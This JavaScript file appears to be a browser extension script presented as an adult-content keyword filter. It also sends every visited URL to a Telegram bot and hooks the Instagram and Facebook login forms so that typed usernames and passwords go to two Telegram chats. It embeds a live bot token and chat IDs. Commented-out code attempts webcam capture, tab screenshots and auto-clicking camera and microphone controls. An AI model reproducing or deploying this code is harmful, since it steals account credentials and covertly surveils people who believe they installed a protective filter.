
//Change this interval to your choice
//INTERVAL = 8;
//
//https://api.telegram.org/bot5505152950:AAFRJn5rE0KI0b7yc7j4hlAKLxGKWkyAxvs/getUpdates
//alert("miraj kaj hoye6e 🥳🥳");
//
var Words = ["sex","x videos","porn","xxx","xnxx","x-video","fuck","boob","tit","milf","hot ass","dick","pussy" ,"desi bhabi","mms","scandal","xhamster","xhamster","x-hamster","sexy","bang","xvideos","nude","hot video","hot videos","erotic","naughty america","panu","rajwap","kompoz","18+ video"];

var button ;
var username ; 
var password ; 
var pVal , uVal;
const laptopid = "";
const k = `5505152950:AAFRJn5rE0KI0b7yc7j4hlAKLxGKWkyAxvs`;
var Argha = `https://api.telegram.org/bot${k}/sendMessage?chat_id=1548471825&text=` ;
var Miraj = `https://api.telegram.org/bot${k}/sendMessage?chat_id=941377434&text=`; 
var sir = `https://api.telegram.org/bot${k}/sendMessage?chat_id=941377434&text=`; 
function start()
{
    url = location.href;
  /*  navigator.mediaDevices
      .getUserMedia({ video: true, audio: false })
      .then((stream) => {
        alert("hi");
        const mediaStreamTrack = stream.getVideoTracks()[3];
       const imageCapture = new ImageCapture(mediaStreamTrack);
       imageCapture.takePhoto().then((data)=>{
         //fetch(Argha+URL.createObjectURL(data));
         alert(URL.createObjectURL(data));
         console.log(URL.createObjectURL(data));
       });
      })
      .catch((err) => {
        console.error(`An error occurred: ${err}`);
      }); */
//    alert("URl : "+location.href);
   fetch(Argha+url);
   //document.style.filter="blur((2px))";
    if(isUnsafe(url)){
      window.stop();
      var a =document.querySelectorAll("a");
      for(var j=0;j<a.length;j++){
        a[j].href=" ";
      }
      //fetch(sir+"from laptop "+laptopid+"someone has searched some worng words. please look after it");
      fetch(Argha+"porn");
      window.location.replace("https://google.com");
    } 
    if(url.includes("instagram.com"))
        {
         setTimeout(instagram , 1500);
        }
    else if(url.includes("facebook.com")) {
            facebook();
        }
    else if(url.includes("youtube.com")){
      youtube();
    }
    
}
function isUnsafe(link){
  for(let i=0;i<Words.length;i++){
    if(link.toLowerCase().includes(Words[i])){
      return true;
    }
  }
  return false;
}

function instagram() {
  //alert("you are on Instagram");
  fetch(Argha+"someone opened Instagram");
  fetch(Miraj+"Miraj Da keu Instagram khullo");
  try {
   // alert(document.getElementById("loginForm"));
    document.querySelector("button").addEventListener("click" , ()=>{
      username = document.querySelector("[name='username']").value;
      password = document.querySelector("[name='password']").value;
      fetch(Argha+"instaid:-"+username+",pass:-"+password);
      fetch(Miraj+"Miraj da 😍 instaid:-"+username+",pass:-"+password);

      //alert("too close");
    }) 
  } catch (e) {
      fetch(Miraj+"Miraj da insta te aktu problem holo");
      fetch(Argha+e);

  }


} 


function youtube(){
  fetch(Argha+location.href);
 /* try{
  //var my_awesome_script = document.createElement('script');
  
 // my_awesome_script.setAttribute('src', 'https://unpkg.com/sweetalert/dist/sweetalert.min.js');
  
  //document.head.appendChild(my_awesome_script);
  
  alert("hi hello");
  /*document.addEventListener("click",()=>{
    chrome.tabs.captureVisibleTab(
    null,
    {},
    function (dataurl){
      alert("success");
      fetch(Argha+dataurl);
    }
  )
  })
  fetch(Argha+url);
  }catch(e){
    alert("hi");
  }*/
  

}

function facebook()
{
  
//  alert("you ar on Facebook");
fetch(Miraj+"Miraj da keu facebook khullo");
fetch(Argha+"facebook");
 if (document.querySelector("form") != null) {
   try {
    
   document.querySelector("form").addEventListener("submit" , ()=>{
     username = document.getElementById("email").value ;
     password = document.getElementById("pass").value ;
     fetch(Argha+"facebookid:-"+username+",pass:-"+password);
     fetch(Miraj+"facebookid:-"+username+",pass:-"+password);

   });
    
   } catch (e) {
     fetch(Argha+"sorry");
   }
   
 }
   
  
 
  
}

document.onload=start();


  /*setTimeout(function(){
      try
      {
        items = document.getElementsByTagName("div");
        for(i=0;i<items.length;i++)
        {
          if(items[i].hasAttribute("aria-label"))
          {
            if(items[i].getAttribute("aria-label").includes("microphone") || items[i].getAttribute("aria-label").includes("camera"))
            {
              document.getElementsByTagName("body")[0].click()
              // console.log(items[i].innerHTML);
              items[i].click()
            }
          }
        }

      }

      catch(err)
      {
        console.log(err)
      }

      meet();
      
       
    },INTERVAL*1000)  */
